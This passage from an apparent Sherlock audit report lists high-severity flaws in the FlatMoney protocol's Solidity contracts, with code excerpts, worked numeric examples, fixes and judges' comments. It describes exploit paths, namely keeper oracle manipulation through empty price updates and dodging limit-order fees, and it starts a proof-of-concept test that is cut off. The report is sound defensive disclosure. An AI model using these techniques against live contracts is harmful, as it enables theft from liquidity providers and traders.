In the end, `newMarginDepositedTotal` is 5 ETH and `stableCollateralTotal` is 15 ETH. There are 20 ETH balance as collateral in the vault.

```solidity
(newMarginDepositedTotal + stableCollateralTotal) == (20 ETH balance as collateral in the vault)
```

Thus, they are in sync now. Also, there is no revert or underflow error.



## Discussion

**sherlock-admin**

1 comment(s) were left on this issue during the judging contest.

**takarez** commented:
>  valid: high(5)



# Issue H-9: Incorrect skew check formula used during withdrawal 

Source: https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/193 

## Found by 
Bony, dany.armstrong90, deepplus, ni8mare, xiaoming90
## Summary

The purpose of the long max skew (`skewFractionMax`) is to prevent the FlatCoin holders from being increasingly short. However, the existing controls are not adequate, resulting in the long skew exceeding the long max skew deemed acceptable by the protocol, as shown in the example in this report. 

When the  FlatCoin holders are overly net short, an increase in the collateral price (rETH) leads to a more pronounced decrease in the price of UNIT, amplifying the risk and loss of the FlatCoin holders and increasing the risk of UNIT's price going to 0.

## Vulnerability Detail

When the users withdraw their collateral (rETH) from the system, the skew check (`checkSkewMax()`) at Line 132 will be executed to ensure that the withdrawal does not cause the system to be too skewed towards longs and the skew is still within the `skewFractionMax`.

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/DelayedOrder.sol#L132

```solidity
File: DelayedOrder.sol
109:     function announceStableWithdraw(
110:         uint256 withdrawAmount,
111:         uint256 minAmountOut,
112:         uint256 keeperFee
113:     ) external whenNotPaused {
114:         uint64 executableAtTime = _prepareAnnouncementOrder(keeperFee);
115: 
116:         IStableModule stableModule = IStableModule(vault.moduleAddress(FlatcoinModuleKeys._STABLE_MODULE_KEY));
117:         uint256 lpBalance = IERC20Upgradeable(stableModule).balanceOf(msg.sender);
118: 
119:         if (lpBalance < withdrawAmount)
120:             revert FlatcoinErrors.NotEnoughBalanceForWithdraw(msg.sender, lpBalance, withdrawAmount);
121: 
122:         // Check that the requested minAmountOut is feasible
123:         {
124:             uint256 expectedAmountOut = stableModule.stableWithdrawQuote(withdrawAmount);
125: 
126:             if (keeperFee > expectedAmountOut) revert FlatcoinErrors.WithdrawalTooSmall(expectedAmountOut, keeperFee);
127: 
128:             expectedAmountOut -= keeperFee;
129: 
130:             if (expectedAmountOut < minAmountOut) revert FlatcoinErrors.HighSlippage(expectedAmountOut, minAmountOut);
131: 
132:             vault.checkSkewMax({additionalSkew: expectedAmountOut});
133:         }
```

However, using the `checkSkewMax` function for checking skew when LPs/stakers withdraw collateral from the system is incorrect. The `checkSkewMax` function is specifically used when there is a change in position size on the long-trader side.

In Line 303 below, the numerator of the formula holds the collateral/margin size of the long traders, while the denominator of the formula holds the collateral size of the LPs. When the LP withdraws collateral from the system, it should be deducted from the denominator. Thus, the formula is incorrect to be used in this scenario.

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/FlatcoinVault.sol#L303

```solidity
File: FlatcoinVault.sol
294:     /// @notice Asserts that the system will not be too skewed towards longs after additional skew is added (position change).
295:     /// @param _additionalSkew The additional skew added by either opening a long or closing an LP position.
296:     function checkSkewMax(uint256 _additionalSkew) public view {
297:         // check that skew is not essentially disabled
298:         if (skewFractionMax < type(uint256).max) {
299:             uint256 sizeOpenedTotal = _globalPositions.sizeOpenedTotal;
300: 
301:             if (stableCollateralTotal == 0) revert FlatcoinErrors.ZeroValue("stableCollateralTotal");
302: 
303:             uint256 longSkewFraction = ((sizeOpenedTotal + _additionalSkew) * 1e18) / stableCollateralTotal;
304: 
305:             if (longSkewFraction > skewFractionMax) revert FlatcoinErrors.MaxSkewReached(longSkewFraction);
306:         }
307:     }
```

Let's make a comparison between the current formula and the expected (correct) formula to determine if there is any difference:

Let `sizeOpenedTotal` be $SO_{total}$, `stableCollateralTotal` be $SC_{total}$ and `_additionalSkew` be $AS$. Assume that the `sizeOpenedTotal` is 100 ETH and `stableCollateralTotal` is 100 ETH. Thus, the current `longSkewFraction` is zero as both the long and short sizes are the same.

Assume that someone intends to withdraw 20 ETH collateral from the system. Thus, the `_additionalSkew` will be 20 ETH.

**Current Formula**

$$
\begin{align} 
skewFrac = \frac{SO_{total} + AS}{SC_{total}} \\
skewFrac = \frac{100 + 20}{100} = 1.2
\end{align}
$$

**Expected (correct) formula**

$$
\begin{align} 
skewFrac = \frac{SO_{total}}{SC_{total} - AS} \\
skewFrac = \frac{100}{100 - 20} = 1.25
\end{align}
$$

Assume the `skewFractionMax` is 1.20 within the protocol.

The first formula will indicate that the long skew after the withdrawal will not exceed the long max skew, and thus, the withdrawal will proceed to be executed. Immediately after the execution is completed, the system exceeds the `skewFractionMax` of 1.2 as the current long skew has become 1.25.

## Impact

The purpose of the long max skew (`skewFractionMax`) is to prevent the FlatCoin holders from being increasingly short. However, the existing controls are not adequate, resulting in the long skew exceeding the long max skew deemed acceptable by the protocol, as shown in the example above. 

When the FlatCoin holders are overly net short, an increase in the collateral price (rETH) leads to a more pronounced decrease in the price of UNIT, amplifying the risk and loss of the FlatCoin holders and increasing the risk of UNIT's price going to 0.

## Code Snippet

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/FlatcoinVault.sol#L303

## Tool used

Manual Review

## Recommendation

The `checkSkewMax` function is designed specifically for long trader's operations such as open, adjust, and close positions. They cannot be used interchangeably with the LP's operations, such as depositing and withdrawing stable collateral.

Consider implementing a new function that uses the following for calculating the long skew after withdrawal:

$$
skewFrac = \frac{SO_{total}}{SC_{total} - AS}
$$

Let `sizeOpenedTotal` be $SO_{total}$, `stableCollateralTotal` be $SC_{total}$ and `_additionalSkew` be $AS$. 



## Discussion

**sherlock-admin**

1 comment(s) were left on this issue during the judging contest.

**takarez** commented:
>  valid: medium(7)



**sherlock-admin**

The protocol team fixed this issue in PR/commit https://github.com/dhedge/flatcoin-v1/pull/273.

# Issue H-10: Malicious keepers can manipulate the price when executing an order 

Source: https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/194 

## Found by 
LTDingZhen, nobody2018, xiaoming90
## Summary

Malicious keepers can manipulate the price when executing an order by selecting a price in favor of either the LPs or long traders, leading to a loss of assets to the victim's party.

## Vulnerability Detail

When the keeper executes an order, it was understood from the protocol team that the protocol expects that the keeper must also update the Pyth price to the latest one available off-chain. In addition, the [contest page](https://github.com/sherlock-audit/2023-12-flatmoney-xiaoming9090?tab=readme-ov-file#q-are-there-any-off-chain-mechanisms-or-off-chain-procedures-for-the-protocol-keeper-bots-input-validation-expectations-etc) mentioned that "an offchain price that is pulled by the keeper and pushed onchain at time of any order execution".

This requirement must be enforced to ensure that the latest price is always used.

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/DelayedOrder.sol#L386

```solidity
File: DelayedOrder.sol
378:     function executeOrder(
379:         address account,
380:         bytes[] calldata priceUpdateData
381:     )
382:         external
383:         payable
384:         nonReentrant
385:         whenNotPaused
386:         updatePythPrice(vault, msg.sender, priceUpdateData)
387:         orderInvariantChecks(vault)
388:     {
389:         // Settle funding fees before executing any order.
390:         // This is to avoid error related to max caps or max skew reached when the market has been skewed to one side for a long time.
391:         // This is more important in case the we allow for limit orders in the future.
392:         vault.settleFundingFees();
..SNIP..
410:     }
```

However, this requirement can be bypassed by malicious keepers. A keeper could skip or avoid the updating of the Pyth price by passing in an empty `priceUpdateData` array, which will pass the empty array to the `OracleModule.updatePythPrice` function.

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/abstracts/OracleModifiers.sol#L12

```solidity
File: OracleModifiers.sol
10:     /// @dev Important to use this modifier in functions which require the Pyth network price to be updated.
11:     ///      Otherwise, the invariant checks or any other logic which depends on the Pyth network price may not be correct.
12:     modifier updatePythPrice(
13:         IFlatcoinVault vault,
14:         address sender,
15:         bytes[] calldata priceUpdateData
16:     ) {
17:         IOracleModule(vault.moduleAddress(FlatcoinModuleKeys._ORACLE_MODULE_KEY)).updatePythPrice{value: msg.value}(
18:             sender,
19:             priceUpdateData
20:         );
21:         _;
22:     }
```

When the Pyth's `Pyth.updatePriceFeeds` function is executed, the `updateData` parameter will be set to an empty array.

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/OracleModule.sol#L64

```solidity
File: OracleModule.sol
64:     function updatePythPrice(address sender, bytes[] calldata priceUpdateData) external payable nonReentrant {
65:         // Get fee amount to pay to Pyth
66:         uint256 fee = offchainOracle.oracleContract.getUpdateFee(priceUpdateData);
67: 
68:         // Update the price data (and pay the fee)
69:         offchainOracle.oracleContract.updatePriceFeeds{value: fee}(priceUpdateData);
70: 
71:         if (msg.value - fee > 0) {
72:             // Need to refund caller. Try to return unused value, or revert if failed
73:             (bool success, ) = sender.call{value: msg.value - fee}("");
74:             if (success == false) revert FlatcoinErrors.RefundFailed();
75:         }
76:     }
```

Inspecting the source code of Pyth's on-chain contract, the [`Pyth.updatePriceFeeds`](https://goerli.basescan.org/address/0xf5bbe9558f4bf37f1eb82fb2cedb1c775fa56832#code#F24#L75) function will not perform any update since the `updateData.length` will be zero in this instance.

https://goerli.basescan.org/address/0xf5bbe9558f4bf37f1eb82fb2cedb1c775fa56832#code#F24#L75

```solidity
function updatePriceFeeds(
    bytes[] calldata updateData
) public payable override {
    uint totalNumUpdates = 0;
    for (uint i = 0; i < updateData.length; ) {
        if (
            updateData[i].length > 4 &&
            UnsafeCalldataBytesLib.toUint32(updateData[i], 0) ==
            ACCUMULATOR_MAGIC
        ) {
            totalNumUpdates += updatePriceInfosFromAccumulatorUpdate(
                updateData[i]
            );
        } else {
            updatePriceBatchFromVm(updateData[i]);
            totalNumUpdates += 1;
        }

        unchecked {
            i++;
        }
    }
    uint requiredFee = getTotalFee(totalNumUpdates);
    if (msg.value < requiredFee) revert PythErrors.InsufficientFee();
}
```

The keeper is permissionless, thus anyone can be a keeper and execute order on the protocol. If this requirement is not enforced, keepers who might also be LPs (or collude with LPs) can choose whether to update the Pyth price to the latest price or not, depending on whether the updated price is in favor of the LPs. For instance, if the existing on-chain price (\$1000 per ETH) is higher than the latest off-chain price (\$950 per ETH), malicious keepers will use the higher price of \$1000 to open the trader's long position so that its position's entry price will be set to a higher price of \$1000. When the latest price of \$950 gets updated, the longer position will immediately incur a loss of \$50. Since this is a zero-sum game, long traders' loss is LPs' gain.

Note that per the current design, when the open long position order is executed at $T2$, any price data with a timestamp between $T1$ and $T2$ is considered valid and can be used within the `executeOpen` function to execute an open order. Thus, when the malicious keeper uses an up-to-date price stored in Pyth's on-chain contract, it will not revert as long as its timestamp is on or after $T1$.

![image](https://github.com/sherlock-audit/2023-12-flatmoney-xiaoming9090/assets/102820284/8ca41703-96c6-4cfe-bfc5-161f59ecaddf)

Alternatively, it is also possible for the opposite scenario to happen where the keepers favor the long traders and choose to use a lower older price on-chain to execute the order instead of using the latest higher price. As such, the long trader's position will be immediately profitable after the price update. In this case, the LPs are on the losing end.

Sidenote: The oracle's `maxDiffPercent` check will not guard against this attack effectively. For instance, in the above example, if the Chainlink price is \$975 and the `maxDiffPercent` is 5%, the Pyth price of \$950 or \$1000 still falls within the acceptable range. If the `maxDiffPercent` is reduced to a smaller margin, it will potentially lead to a more serious issue where all the transactions get reverted when fetching the price, breaking the entire protocol.

## Impact

Loss of assets as shown in the scenario above.

## Code Snippet

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/DelayedOrder.sol#L386

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/abstracts/OracleModifiers.sol#L12

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/OracleModule.sol#L64

## Tool used

Manual Review

## Recommendation

Ensure that the keepers must update the Pyth price when executing an order. Perform additional checks against the `priceUpdateData` submitted by the keepers to ensure that it is not empty and `priceId` within the `PriceInfo` matches the price ID of the collateral (rETH), so as to prevent malicious keeper from bypassing the price update by passing in an empty array or price update data that is not mapped to the collateral (rETH).



## Discussion

**sherlock-admin**

1 comment(s) were left on this issue during the judging contest.

**takarez** commented:
>  invalid



**rashtrakoff**

I don't believe this is an issue due to the check for price freshness [here](https://github.com/dhedge/flatcoin-v1/blob/ea561f48bd9eae11895fc5e4f476abe909d8a634/src/OracleModule.sol#L131). However we can probably implement the suggestion for more protection.

**nevillehuang**

@rashtrakoff If I understand correctly, as long as freshness of price does not exceed `maxAge`, it is an accepted updated price, if not it will revert, hence making this issue invalid.

**nevillehuang**

Hi @rashtrakoff here is LSW comments, which seems valid to me.

> The check at Line 111 basically checks for deviation between the on-chain and off-chain price deviation. If the two prices deviate by a certain percentage `maxDiffPercent` (I recall the test or deployment script set it as 5%), the TX will revert.

> However, it is incorrect that this check will prevent this issue. I expected that the sponsor might assume that this check might prevent this issue during the audit. Thus, in the report (at the end of the "Vulnerability Detail"), I have documented the reasons why this oracle check would not help to prevent this issue, and the example and numbers in the report are specially selected to work within the 5% price deviation 🙂

> Sidenote: The oracle's maxDiffPercent check will not guard against this attack effectively. For instance, in the above example, if the Chainlink price is $975 and the maxDiffPercent is 5%, the Pyth price of $950 or $1000 still falls within the acceptable range. If the maxDiffPercent is reduced to a smaller margin, it will potentially lead to a more serious issue where all the transactions get reverted when fetching the price, breaking the entire protocol.

# Issue H-11: Long trader's deposited margin can be wiped out 

Source: https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/195 

## Found by 
0xrobsol, Bony, deepplus, evmboi32, petro1912, santipu\_, shaka, xiaoming90
## Summary

Long Trader's deposited margin can be wiped out due to a logic error, leading to a loss of assets.

## Vulnerability Detail

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/FlatcoinVault.sol#L232

```solidity
File: FlatcoinVault.sol
216:     function settleFundingFees() public returns (int256 _fundingFees) {
..SNIP..
226:         // Calculate the funding fees accrued to the longs.
227:         // This will be used to adjust the global margin and collateral amounts.
228:         _fundingFees = PerpMath._accruedFundingTotalByLongs(_globalPositions, unrecordedFunding);
229: 
230:         // In the worst case scenario that the last position which remained open is underwater,
231:         // we set the margin deposited total to 0. We don't want to have a negative margin deposited total.
232:         _globalPositions.marginDepositedTotal = (int256(_globalPositions.marginDepositedTotal) > _fundingFees)
233:             ? uint256(int256(_globalPositions.marginDepositedTotal) + _fundingFees)
234:             : 0;
235: 
236:         _updateStableCollateralTotal(-_fundingFees);
```

#### Issue 1

Assume that there are two long positions in the system and the `_globalPositions.marginDepositedTotal` is $X$.

Assume that the funding fees accrued to the long positions at Line 228 is $Y$. $Y$ is a positive value indicating the overall gain/profit that the long traders received from the LPs. 

In this case, the `_globalPositions.marginDepositedTotal` should be set to $(X + Y)$ after taking into consideration the funding fee gain/profit accrued by the long positions.

However, in this scenario, $X < Y$​. Thus, the condition at Line 232 will be evaluated as `false,` and the ` _globalPositions.marginDepositedTotal` will be set to zero. This effectively wipes out all the margin collateral deposited by the long traders in the system, and the deposited margin of the long traders is lost.

#### Issue 2

The second issue with the current implementation is that it does not accurately capture scenarios where the addition of `_globalPositions.marginDepositedTotal` and `_fundingFees` result in a negative number. This is because `_fundingFees` could be a large negative number that, when added to `_globalPositions.marginDepositedTotal`, results in a negative total, but the condition at Line 232 above still evaluates as true, resulting in an underflow revert.

## Impact

Loss of assets for the long traders as mentioned above.

## Code Snippet

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/FlatcoinVault.sol#L232

## Tool used

Manual Review

## Recommendation

If the intention is to ensure that `_globalPositions.marginDepositedTotal` will never become negative, consider summing up $(X + Y)$​ first and determine if the result is less than zero. If yes, set the `_globalPositions.marginDepositedTotal` to zero.

The following is the pseudocode:

```solidity
newMarginTotal = globalPositions.marginDepositedTota + _fundingFees;
globalPositions.marginDepositedTotal = newMarginTotal > 0 ? uint256(newMarginTotal) : 0;
```



## Discussion

**sherlock-admin**

2 comment(s) were left on this issue during the judging contest.

**ubl4nk** commented:
> invalid -> when marginDepositedTotal is less than Zero, all the long-traders all liquidated + some loss for LPs where that position is liquidated a bit late.

**takarez** commented:
>  valid: same fix with issue 181; high(2)



# Issue H-12: Long traders unable to withdraw their assets 

Source: https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/196 

## Found by 
CL001, shaka, xiaoming90
## Summary

Whenever the protocol reaches a state where the long trader's profit is larger than LP's stable collateral total, the protocol will be bricked. As a result, the margin deposited and gain of the long traders can no longer be withdrawn and the LPs cannot withdraw their collateral, leading to a loss of assets for the  users.

## Vulnerability Detail

Per Line 97 below, if the collateral balance is less than the tracked balance, the `_getCollateralNet` invariant check will revert.

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/misc/InvariantChecks.sol#L97

```solidity
File: InvariantChecks.sol
089:     /// @dev Returns the difference between actual total collateral balance in the vault vs tracked collateral
090:     ///      Tracked collateral should be updated when depositing to stable LP (stableCollateralTotal) or
091:     ///      opening leveraged positions (marginDepositedTotal).
092:     /// TODO: Account for margin of error due to rounding.
093:     function _getCollateralNet(IFlatcoinVault vault) private view returns (uint256 netCollateral) {
094:         uint256 collateralBalance = vault.collateral().balanceOf(address(vault));
095:         uint256 trackedCollateral = vault.stableCollateralTotal() + vault.getGlobalPositions().marginDepositedTotal;
096: 
097:         if (collateralBalance < trackedCollateral) revert FlatcoinErrors.InvariantViolation("collateralNet");
098: 
099:         return collateralBalance - trackedCollateral;
100:     }
```

Assume that:

- Bob's long position: Margin = 50 ETH
- Alice's LP: Deposited = 50 ETH
- Collateral Balance = 100 ETH
- Tracked Balance = 100 ETH (Stable Collateral Total = 50 ETH, Margin Deposited Total = 50 ETH)

Assume that Bob's long position gains a profit of 51 ETH.

The following actions will trigger the `updateGlobalPositionData` function internally: executeOpen, executeAdjust, executeClose, and liquidation.

When the ` FlatcoinVault.updateGlobalPositionData` function is triggered to update the global position data:

```solidity
profitLossTotal = 51 ETH (gain by long)

newMarginDepositedTotal = marginDepositedTotal + marginDelta + profitLossTotal
newMarginDepositedTotal = 50 ETH + 0 + 51 ETH = 101 ETH

_updateStableCollateralTotal(-51 ETH)
newStableCollateralTotal = stableCollateralTotal + _stableCollateralAdjustment
newStableCollateralTotal = 50 ETH + (-51 ETH) = -1 ETH
stableCollateralTotal = (newStableCollateralTotal > 0) ? newStableCollateralTotal : 0;
stableCollateralTotal = 0
```

In this case, the state becomes as follows:

- Collateral Balance = 100 ETH
- Tracked Balance = 101 ETH (Stable Collateral Total = 0 ETH, Margin Deposited Total = 101 ETH)

Notice that the Collateral Balance and Tracked Balance are no longer in sync. As such, the revert will occur when the `_getCollateralNet` invariant checks are performed.

Whenever the protocol reaches a state where the long trader's profit is larger than LP's stable collateral total, this issue will occur, and the protocol will be bricked. The margin deposited and gain of the long traders can no longer be withdrawn from the protocol. The LPs also cannot withdraw their collateral.

The reason is that the `_getCollateralNet` invariant checks are performed in all functions of the protocol that can be accessed by users (listed below):

- Deposit
- Withdraw
- Open Position
- Adjust Position
- Close Position
- Liquidate

## Impact

Loss of assets for the users. Since the protocol is bricked due to revert, the long traders are unable to withdraw their deposited margin and gain and the LPs cannot withdraw their collateral.

## Code Snippet

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/misc/InvariantChecks.sol#L97

## Tool used

Manual Review

## Recommendation

Currently, when the loss of the LP is more than the existing `stableCollateralTotal`, the loss will be capped at zero, and it will not go negative. In the above example, the `stableCollateralTotal` is 50, and the loss is 51. Thus, the `stableCollateralTotal` is set to zero instead of -1.

The loss of LP and the gain of the trader should be aligned or symmetric. However, this is not the case in the current implementation. In the above example, the gain of traders is 51, while the loss of LP is 50, which results in a discrepancy here.

To fix the issue, the loss of LP and the gain of the trader should be aligned. For instance, in the above example, if the loss of LP is capped at 50, then the profit of traders must also be capped at 50.

Following is a high-level logic of the fix:

```solidity
If (profitLossTotal > stableCollateralTotal): // (51 > 50) => True
	profitLossTotal = stableCollateralTotal // profitLossTotal = 50
	
newMarginDepositedTotal = marginDepositedTotal + marginDelta + profitLossTotal // 50 + 0 + 50 = 100
	
newStableCollateralTotal = stableCollateralTotal + (-profitLossTotal) // 50 + (-50) = 0
stableCollateralTotal = (newStableCollateralTotal > 0) ? newStableCollateralTotal : 0; // stableCollateralTotal = 0
```

The comment above verifies that the logic is working as intended.



## Discussion

**sherlock-admin**

1 comment(s) were left on this issue during the judging contest.

**takarez** commented:
>  valid: high(6)



# Issue H-13: Losses of some long traders can eat into the margins of others 

Source: https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/198 

## Found by 
xiaoming90
## Summary

The losses of some long traders can eat into the margins of others, resulting in those affected long traders being unable to withdraw their margin and profits, leading to a loss of assets for the long traders.

## Vulnerability Detail

At $T0$, the current price of ETH is \$1000 and assume the following state:

| Alice's Long Position 1                                     | Bob's Long Position 2                                       | Charles (LP)     |
| ------------------------------------------------------------ | ------------------------------------------------------------ | ---------------- |
| Position Size = 6 ETH<br />Margin = 3 ETH<br />Last Price (entry price) = \$1000 | Position Size = 6 ETH<br />Margin = 5 ETH<br />Last Price (entry price) = \$1000 | Deposited 12 ETH |

- The `stableCollateralTotal` will be 12 ETH
- The `GlobalPositions.marginDepositedTotal` will be 8 ETH (3 + 5)
- The `globalPosition.sizeOpenedTotal` will be 12 ETH (6 + 6)
- The total balance of ETH in the vault is 20 ETH. 


As this is a perfectly hedged market, the accrued fee will be zero, and ignored in this report for simplicity's sake.

At $T1$, the price of the ETH drops from \$1000 to \$600. At this point, the settle margin of both long positions will be as follows:

| Alice's Long Position 1                                     | Bob's Long Position 2                                       |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| priceShift = Current Price - Last Price = \$600 - \$1000 = -\$400<br />PnL = (Position Size * priceShift) / Current Price = (6 ETH * -\$400) / \$400 = -4 ETH<br />settleMargin = marginDeposited + PnL = 3 ETH + (-4 ETH) = -1 ETH | PnL = -4 ETH (Same calculation)<br />settleMargin = marginDeposited + PnL = 5 ETH + (-4 ETH) = 1 ETH |

Alice's long position is underwater (settleMargin < 0), so it can be liquidated. When the liquidation is triggered, it will internally call the `updateGlobalPositionData` function. Even if the liquidation does not occur, any of the following actions will also trigger the `updateGlobalPositionData` function internally:

- executeOpen
- executeAdjust
- executeClose

The purpose of the `updateGlobalPositionData` function is to update the global position data. This includes getting the total profit loss of all long traders (Alice & Bob), and updating the margin deposited total + stable collateral total accordingly.

Assume that the `updateGlobalPositionData` function is triggered by one of the above-mentioned functions. Line 179 below will compute the total PnL of all the opened long positions.

```solidity
priceShift = current price - last price
priceShift = $600 - $1000 = -$400

profitLossTotal = (globalPosition.sizeOpenedTotal * priceShift) / current price
profitLossTotal = (12 ETH * -$400) / $600
profitLossTotal = -8 ETH
```

The `profitLossTotal` is -8 ETH. This is aligned with what we have calculated earlier, where Alice's PnL is -4 ETH and Bob's PnL is -4 ETH (total = -8 ETH loss). 

At Line 184 below, the `newMarginDepositedTotal` will be set to as follows (ignoring the `_marginDelta` for simplicity's sake)

```solidity
newMarginDepositedTotal = _globalPositions.marginDepositedTotal + _marginDelta + profitLossTotal
newMarginDepositedTotal = 8 ETH + 0 + (-8 ETH) = 0 ETH
```

What happened above is that 8 ETH collateral is deducted from the long traders and transferred to LP. When `newMarginDepositedTotal` is zero, this means that the long trader no longer owns any collateral. This is incorrect, as Bob's position should still contribute 1 ETH remaining margin to the long trader's pool.

Let's review Alice's Long Position 1: Her position's settled margin is -1 ETH. When the settled margin is -ve then the LPs have to bear the cost of loss per the comment [here](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LiquidationModule.sol#L139). However, in this case, we can see that it is Bob (long trader) instead of LPs who are bearing the cost of Alice's loss, which is incorrect.

Let's review Bob's Long Position 2: His position's settled margin is 1 ETH. If his position's liquidation margin is $LM$, Bob should be able to withdraw $1\  ETH - LM$ of his position's margin. However, in this case, the `marginDepositedTotal` is already zero, so there is no more collateral left on the long trader pool for Bob to withdraw, which is incorrect.

With the current implementation, the losses of some long traders can eat into the margins of others, resulting in those affected long traders being unable to withdraw their margin and profits.

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/FlatcoinVault.sol#L173

```solidity
being File: FlatcoinVault.sol
173:     function updateGlobalPositionData(
174:         uint256 _price,
175:         int256 _marginDelta,
176:         int256 _additionalSizeDelta
177:     ) external onlyAuthorizedModule {
178:         // Get the total profit loss and update the margin deposited total.
179:         int256 profitLossTotal = PerpMath._profitLossTotal({globalPosition: _globalPositions, price: _price});
180: 
181:         // Note that technically, even the funding fees should be accounted for when computing the margin deposited total.
182:         // However, since the funding fees are settled at the same time as the global position data is updated,
183:         // we can ignore the funding fees here.
184:         int256 newMarginDepositedTotal = int256(_globalPositions.marginDepositedTotal) + _marginDelta + profitLossTotal;
185: 
186:         // Check that the sum of margin of all the leverage traders is not negative.
187:         // Rounding errors shouldn't result in a negative margin deposited total given that
188:         // we are rounding down the profit loss of the position.
189:         // If anything, after closing the last position in the system, the `marginDepositedTotal` should can be positive.
190:         // The margin may be negative if liquidations are not happening in a timely manner.
191:         if (newMarginDepositedTotal < 0) {
192:             revert FlatcoinErrors.InsufficientGlobalMargin();
193:         }
194: 
195:         _globalPositions = FlatcoinStructs.GlobalPositions({
196:             marginDepositedTotal: uint256(newMarginDepositedTotal),
197:             sizeOpenedTotal: (int256(_globalPositions.sizeOpenedTotal) + _additionalSizeDelta).toUint256(),
198:             lastPrice: _price
199:         });
200: 
201:         // Profit loss of leverage traders has to be accounted for by adjusting the stable collateral total.
202:         // Note that technically, even the funding fees should be accounted for when computing the stable collateral total.
203:         // However, since the funding fees are settled at the same time as the global position data is updated,
204:         // we can ignore the funding fees here
205:         _updateStableCollateralTotal(-profitLossTotal);
206:     }
```

## Impact

Loss of assets for the long traders as the losses of some long traders can eat into the margins of others, resulting in those affected long traders being unable to withdraw their margin and profits.

## Code Snippet

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/FlatcoinVault.sol#L173

## Tool used

Manual Review

## Recommendation

The following are the two issues identified earlier and the recommended fixes:

**Issue 1**

> Let's review Alice's Long Position 1: Her position's settled margin is -1 ETH. When the settled margin is -ve then the LPs have to bear the cost of loss per the comment [here](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LiquidationModule.sol#L139). However, in this case, we can see that it is Bob (long trader) instead of LPs who are bearing the cost of Alice's loss, which is incorrect.

Fix: Alice -1 ETH loss should be borne by the LP, not the long traders. The stable collateral total of LP should be deducted by 1 ETH to bear the cost of the loss.

**Issue 2**

> Let's review Bob's Long Position 2: His position's settled margin is 1 ETH. If his position's liquidation margin is $LM$, Bob should be able to withdraw $1\  ETH - LM$ of his position's margin. However, in this case, the `marginDepositedTotal` is already zero, so there is no more collateral left on the long trader pool for Bob to withdraw, which is incorrect.

Fix: Bob should be able to withdraw $1\  ETH - LM$ of his position's margin regardless of the PnL of other long traders. Bob's margin should be isolated from Alice's loss.



## Discussion

**sherlock-admin**

1 comment(s) were left on this issue during the judging contest.

**takarez** commented:
>  valid: high(7)



# Issue H-14: Trade fees can be avoided in limit orders 

Source: https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/212 

## Found by 
0xLogos, LTDingZhen, jennifer37, nobody2018, santipu\_, shaka
## Summary

On limit order announcement the trade fee is calculated based on the current size of the position and its value is used on the execution of the limit order. However, it is not taken into account that the value of `additionalSize` in the position can have changed since the limit order was announced, so users can avoid paying trade fees for closing leveraged positions at the expense of LPs.

## Vulnerability Detail

When a user announces a limit order to close a leveraged position the trade fee [is calculated](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LimitOrder.sol#L62-L64) based on the current trade fee rate and the `additionalSize` of the position and [stored](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LimitOrder.sol#L69) in the `_limitOrderClose` mapping.

On the execution of the limit order, the value of the trade fee recorded in the `_limitOrderClose` mapping is [used to build the `AnnoundedLeverageClose` struct](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LimitOrder.sol#L166-L172) that is sent to the `LeverageModule:executeClose` function. In this function the trade fee is [used to pay the stable LPs](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LeverageModule.sol#L310) and [subtracted from the total amount](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LeverageModule.sol#L314) received by the user closing the position.

However, it is not taken into account that the value of `additionalSize` in the position can have changed since the limit order was announced [via the `LeverageModule:executeAdjust` function](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LeverageModule.sol#L196).

As a result, users that want to open a limit order can do so using the minimum `additionalSize` possible and then increase it after the limit order is announced, avoiding paying the trade fee for the additional size adjustment.

It is also worth mentioning that the trade fee rate can change between the announcement and the execution of the limit order, so the trade fee calculated at the announcement time can be different from the one used at the execution time. Although this scenario is much less likely to happen (requires the governance to change the trade fee rate) and its impact is much lower (the trade fee rate is not likely to change significantly).


## Impact

Users can avoid paying trade fees for closing leveraged positions at the expense of UNIT LPs, that should have received the trade fee.

## Code Snippet

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LimitOrder.sol#L62-L64

## Proof of concept

<details>

<summary>Tests</summary>

The following tests show the example of a user that opens a limit order to be executed when the price doubles. 

The operations performed in both tests are identical, but the order of the operations is different, so we can see how a user can exploit the system to avoid paying trade fees.

To reproduce it add the following code to `AdjustPositionTest` contract and run `forge test --mt test_LimitTradeFee -vv`:

```solidity
    function test_LimitTradeFee_ExpectedBehaviour() public {
        uint256 aliceCollateralBalanceBefore = WETH.balanceOf(alice);
        uint256 collateralPrice = 1000e8;

        announceAndExecuteDeposit({
            traderAccount: bob,
            keeperAccount: keeper,
